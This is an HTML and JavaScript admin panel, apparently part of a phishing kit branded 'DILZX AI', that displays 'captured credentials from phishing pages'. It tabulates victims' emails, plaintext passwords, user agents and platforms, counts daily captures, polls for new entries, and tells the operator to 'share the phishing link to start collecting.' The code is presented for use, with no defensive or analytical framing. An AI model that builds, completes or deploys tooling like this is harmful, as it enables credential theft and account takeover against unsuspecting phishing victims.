<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DILZX AI - Admin Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0a0f1e 0%, #0a0a1a 100%);
            font-family: monospace;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .header {
            background: rgba(20, 25, 45, 0.95);
            border-radius: 16px;
            padding: 24px;
            margin-bottom: 24px;
            border: 1px solid rgba(0, 212, 255, 0.3);
        }

        h1 {
            color: #00d4ff;
            margin-bottom: 8px;
        }

        .stats {
            display: flex;
            gap: 20px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }

        .stat-card {
            background: #0f1222;
            border: 1px solid #2a2d44;
            border-radius: 12px;
            padding: 16px 24px;
            flex: 1;
        }

        .stat-value {
            font-size: 32px;
            font-weight: bold;
            color: #00d4ff;
        }

        .stat-label {
            color: #8b8ca8;
            font-size: 12px;
            margin-top: 4px;
        }

        table {
            width: 100%;
            background: #0f1222;
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid #2a2d44;
        }

        th, td {
            padding: 14px 16px;
            text-align: left;
            border-bottom: 1px solid #2a2d44;
        }

        th {
            background: rgba(0, 212, 255, 0.1);
            color: #00d4ff;
            font-weight: 600;
        }

        td {
            color: #cbd5e6;
            font-size: 13px;
        }

        .badge {
            background: #00d4ff20;
            color: #00d4ff;
            padding: 4px 8px;
            border-radius: 6px;
            font-size: 11px;
        }

        .refresh-btn {
            background: linear-gradient(135deg, #00d4ff, #7b2cbf);
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            color: white;
            cursor: pointer;
            margin-bottom: 20px;
        }

        .empty-state {
            text-align: center;
            padding: 60px;
            color: #8b8ca8;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 DILZX AI - ADMIN PANEL</h1>
            <p>Captured credentials from phishing pages</p>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="stat-value" id="totalCount">0</div>
                <div class="stat-label">Total Captured</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="todayCount">0</div>
                <div class="stat-label">Today</div>
            </div>
        </div>

        <button class="refresh-btn" onclick="loadData()">⟳ Refresh Data</button>

        <div id="tableContainer"></div>
    </div>

    <script>
        // Data disimpan di localStorage untuk admin panel
        // Karena Vercel serverless tidak persistent, kita simpan di client
        
        let capturedData = [];

        function loadData() {
            const saved = localStorage.getItem('dilzx_captured');
            if (saved) {
                capturedData = JSON.parse(saved);
            }
            
            updateDisplay();
        }

        function updateDisplay() {
            const total = capturedData.length;
            const today = capturedData.filter(d => {
                const date = new Date(d.timestamp).toDateString();
                return date === new Date().toDateString();
            }).length;
            
            document.getElementById('totalCount').innerText = total;
            document.getElementById('todayCount').innerText = today;
            
            const container = document.getElementById('tableContainer');
            
            if (capturedData.length === 0) {
                container.innerHTML = `
                    <div class="empty-state">
                        📭 No captured credentials yet.<br>
                        Share the phishing link to start collecting.
                    </div>
                `;
                return;
            }
            
            let html = `
                <table>
                    <thead>
                        <tr><th>Time</th><th>Email</th><th>Password</th><th>User Agent</th><th>IP/Location</th></tr>
                    </thead>
                    <tbody>
            `;
            
            capturedData.reverse().forEach(data => {
                html += `
                    <tr>
                        <td>${new Date(data.timestamp).toLocaleString()}</td>
                        <td><strong style="color:#00d4ff;">${data.email || '-'}</strong></td>
                        <td>${data.password || '-'}</td>
                        <td style="font-size:11px;">${(data.userAgent || '-').substring(0, 60)}...</td>
                        <td>${data.platform || '-'}</td>
                    </tr>
                `;
            });
            
            html += '</tbody></table>';
            container.innerHTML = html;
        }

        // Listen for new data from capture API (via localStorage sync)
        function checkForNewData() {
            const saved = localStorage.getItem('dilzx_captured');
            if (saved) {
                const newData = JSON.parse(saved);
                if (newData.length !== capturedData.length) {
                    capturedData = newData;
                    updateDisplay();
                }
            }
        }
        
        // Simulate receiving data (in real scenario, capture API would save to localStorage)
        // For demo, we'll add sample data
        function addSampleData() {
            const sample = {
                email: 'test@example.com',
                password: 'sample123',
                timestamp: new Date().toISOString(),
                userAgent: 'Mozilla/5.0 (Test)',
                platform: 'Windows'
            };
            capturedData.unshift(sample);
            localStorage.setItem('dilzx_captured', JSON.stringify(capturedData));
            updateDisplay();
        }
        
        loadData();
        setInterval(checkForNewData, 3000);
    </script>
</body>
</html>
